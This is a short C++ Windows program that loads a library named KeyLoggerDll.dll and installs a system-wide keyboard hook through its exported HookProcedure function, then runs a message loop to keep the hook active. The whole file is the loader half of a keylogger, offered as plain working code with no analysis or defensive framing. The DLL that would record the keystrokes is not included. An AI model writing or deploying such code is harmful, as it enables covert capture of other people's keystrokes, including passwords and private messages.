#include <iostream>
#include <string>
#include <Windows.h>

int WINAPI wWinMain(HINSTANCE , HINSTANCE , PWSTR , int )
{
	HMODULE keylogger = LoadLibraryA("KeyLoggerDll.dll");
	HHOOK KeyboardHook = SetWindowsHookEx(
		WH_KEYBOARD,
		reinterpret_cast<HOOKPROC>(GetProcAddress(keylogger, "HookProcedure")),
		keylogger,
		NULL
	);
	
	if (!KeyboardHook) {
		OutputDebugStringA(std::to_string(GetLastError()).c_str());
	}

	MSG Msg;
	while (GetMessage(&Msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);
	}
}